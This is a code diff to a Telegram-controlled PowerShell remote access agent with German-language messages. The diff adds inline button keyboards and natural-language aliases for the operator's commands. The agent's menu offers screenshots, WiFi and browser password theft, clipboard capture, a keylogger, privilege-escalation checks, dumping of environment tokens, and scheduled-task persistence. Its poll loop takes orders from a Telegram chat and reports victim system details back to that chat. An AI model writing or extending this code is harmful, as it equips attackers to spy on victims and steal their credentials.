@@ -127,9 +127,45 @@ function Take-Screenshot {
 _TG_HELPERS_PS1 = r"""
 function TG-Send {
     param([string]$Text)
-    $body = @{ chat_id=$TG_CHAT; text=$Text; parse_mode="HTML" } | ConvertTo-Json
+    $body = @{ chat_id=$TG_CHAT; text=$Text; parse_mode="HTML" } | ConvertTo-Json -Compress
     try {
         Invoke-RestMethod -Uri "$TG_API/sendMessage" -Method POST `
+            -ContentType "application/json; charset=utf-8" `
+            -Body ([System.Text.Encoding]::UTF8.GetBytes($body)) -ErrorAction Stop | Out-Null
+    } catch {}
+}
+
+# Build inline keyboard JSON from layout array.
+# Each row is a string array of "Label|callback_data" entries.
+function Make-Keyboard {
+    param([string[][]]$Layout)
+    $rows = foreach ($row in $Layout) {
+        $btns = foreach ($btn in $row) {
+            $p = $btn -split "\|", 2
+            "{`"text`":`"$($p[0])`",`"callback_data`":`"$($p[1])`"}"
+        }
+        "[" + ($btns -join ",") + "]"
+    }
+    return "{`"inline_keyboard`":[" + ($rows -join ",") + "]}"
+}
+
+function TG-SendButtons {
+    param([string]$Text, [string]$Keyboard)
+    # Use ConvertTo-Json for safe text escaping, then inject keyboard
+    $base = @{ chat_id=$TG_CHAT; text=$Text; parse_mode="HTML" } | ConvertTo-Json -Compress
+    $json = $base.TrimEnd("}") + ",`"reply_markup`":$Keyboard}"
+    try {
+        Invoke-RestMethod -Uri "$TG_API/sendMessage" -Method POST `
+            -ContentType "application/json; charset=utf-8" `
+            -Body ([System.Text.Encoding]::UTF8.GetBytes($json)) -ErrorAction Stop | Out-Null
+    } catch {}
+}
+
+function TG-AnswerCallback {
+    param([string]$Id, [string]$Toast="")
+    try {
+        $body = "{`"callback_query_id`":`"$Id`",`"text`":`"$Toast`"}"
+        Invoke-RestMethod -Uri "$TG_API/answerCallbackQuery" -Method POST `
             -ContentType "application/json" -Body $body -ErrorAction Stop | Out-Null
     } catch {}
 }
@@ -156,6 +192,44 @@ function TG-GetUpdates {
         $r = Invoke-RestMethod -Uri "$TG_API/getUpdates?offset=$Offset&timeout=5" -ErrorAction Stop
         return $r.result
     } catch { return @() }
+}
+
+# Main action keyboard — always shown after status and boot
+function Get-MainKeyboard {
+    return Make-Keyboard @(
+        @("📸 Screenshot|!screenshot",  "🖥️ Sysinfo|!sysinfo",    "👤 Whoami|!whoami"),
+        @("🔑 WiFi Creds|!wifi",        "🌐 Browser|!browsers",   "📋 Clipboard|!clipboard"),
+        @("⌨️ Keylog AN|!keylog start",  "🔒 PrivEsc|!privesc",    "📡 Netstat|!netstat"),
+        @("🗂️ Desktop|!ls Desktop",      "📥 Downloads|!ls Downloads", "🌍 Env|!env"),
+        @("⚙️ Persistieren|!persist",    "❓ Help|!help",           "🔴 Exit|!exit")
+    )
+}
+
+# Natürliche Sprache → Befehl
+function Resolve-Alias {
+    param([string]$Text)
+    $t = $Text.ToLower().Trim()
+    $map = @{
+        "screenshot"="!screenshot"; "foto"="!screenshot"; "bild"="!screenshot"
+        "screen"="!screenshot"; "ss"="!screenshot"; "schreib"="!screenshot"
+        "sys"="!sysinfo"; "sysinfo"="!sysinfo"; "info"="!sysinfo"
+        "system"="!sysinfo"; "status"="!sysinfo"
+        "who"="!whoami"; "whoami"="!whoami"; "ich"="!whoami"; "user"="!whoami"
+        "wifi"="!wifi"; "wlan"="!wifi"; "netzwerk"="!wifi"
+        "browser"="!browsers"; "chrome"="!browsers"; "firefox"="!browsers"
+        "passwords"="!browsers"; "passwort"="!browsers"; "pass"="!browsers"
+        "clip"="!clipboard"; "clipboard"="!clipboard"; "zwischenablage"="!clipboard"
+        "keylog"="!keylog start"; "keylogger"="!keylog start"; "tastatur"="!keylog start"
+        "priv"="!privesc"; "privesc"="!privesc"; "rechte"="!privesc"; "admin"="!privesc"
+        "net"="!netstat"; "netz"="!netstat"; "netstat"="!netstat"; "ports"="!netstat"
+        "env"="!env"; "api"="!env"; "tokens"="!env"; "keys"="!env"
+        "persist"="!persist"; "autostart"="!persist"
+        "help"="!help"; "hilfe"="!help"; "befehle"="!help"; "commands"="!help"
+        "exit"="!exit"; "stop"="!exit"; "aus"="!exit"; "beenden"="!exit"
+        "creds"="!creds"; "credentials"="!creds"; "anmeldedaten"="!creds"
+    }
+    if ($map.ContainsKey($t)) { return $map[$t] }
+    return $Text
 }
 """
 
@@ -195,8 +269,9 @@ function Handle-Command {
         $msg += "<code>!privesc</code>      — PrivEsc Checks`n"
         $msg += "<code>!persist</code>      — Scheduled Task`n"
         $msg += "<code>!unpersist</code>    — Task entfernen`n"
-        $msg += "<code>!exit</code>         — Agent beenden"
-        TG-Send $msg
+        $msg += "<code>!exit</code>         — Agent beenden`n`n"
+        $msg += "💬 <i>Tipp: Schreibe einfach z.B. 'screenshot' oder 'wifi' — ich verstehe auch Deutsch!</i>"
+        TG-SendButtons $msg (Get-MainKeyboard)
         return
     }
 
@@ -257,7 +332,12 @@ function Handle-Command {
         $msg += "🔄 <b>Prozesse:</b> <code>$procs</code>`n`n"
         $msg += "🛡️ <b>AV:</b>      <code>$av</code>`n"
         $msg += "⏰ <b>Zeit:</b>    <code>$(Get-Date -Format 'dd.MM.yyyy HH:mm:ss')</code>"
+        $followUp = Make-Keyboard @(
+            @("🔒 PrivEsc|!privesc",  "🔑 WiFi|!wifi",        "🌐 Browser|!browsers"),
+            @("📸 Screenshot|!screenshot", "⌨️ Keylog AN|!keylog start", "🌍 Env|!env")
+        )
         TG-Send $msg
+        TG-SendButtons "🎯 <b>Was als nächstes?</b>" $followUp
         return
     }
 
@@ -576,9 +656,8 @@ function Send-StatusPing {
     $msg += "🔄 <b>Prozesse:</b> <code>$procs</code>`n"
     $msg += "$av`n"
     if ($klStatus) { $msg += "$klStatus`n" }
-    $msg += "`n⏰ <code>$(Get-Date -Format 'dd.MM.yyyy HH:mm:ss')</code>`n"
-    $msg += "`n📋 <code>!help</code> — alle Befehle"
-    TG-Send $msg
+    $msg += "`n⏰ <code>$(Get-Date -Format 'dd.MM.yyyy HH:mm:ss')</code>"
+    TG-SendButtons $msg (Get-MainKeyboard)
 }
 """
 
@@ -612,23 +691,33 @@ $_boot = (
     "🧠 <b>RAM:</b>      <code>$_ram</code>`n" +
     "🛡️ <b>AV:</b>       <code>$_av</code>`n" +
     "⚙️ <b>PS:</b>       <code>v$_ps</code>`n" +
-    "⏰ <b>Zeit:</b>     <code>$(Get-Date -Format 'dd.MM.yyyy HH:mm:ss')</code>`n`n" +
-    "📋 <code>!help</code> — alle Befehle"
+    "⏰ <b>Zeit:</b>     <code>$(Get-Date -Format 'dd.MM.yyyy HH:mm:ss')</code>"
 )
-TG-Send $_boot
+TG-SendButtons $_boot (Get-MainKeyboard)
 
 # ── Poll loop ──
 while ($true) {
     $updates = TG-GetUpdates -Offset $offset
     foreach ($u in $updates) {
         $offset = $u.update_id + 1
+
+        # Inline-Button gedrückt (callback_query)
+        if ($u.callback_query) {
+            TG-AnswerCallback -Id $u.callback_query.id
+            Handle-Command -Text $u.callback_query.data -MsgId 0
+            continue
+        }
+
         $text = $u.message.text
         if (-not $text) { continue }
         $text = $text.Trim()
+
+        # Natürliche Sprache → Befehl auflösen
+        $text = Resolve-Alias -Text $text
+
         if ($text.StartsWith("!")) {
             Handle-Command -Text $text -MsgId $u.message.message_id
         } else {
-            # Jede normale Nachricht → Status-Ping
             Send-StatusPing
         }
     }
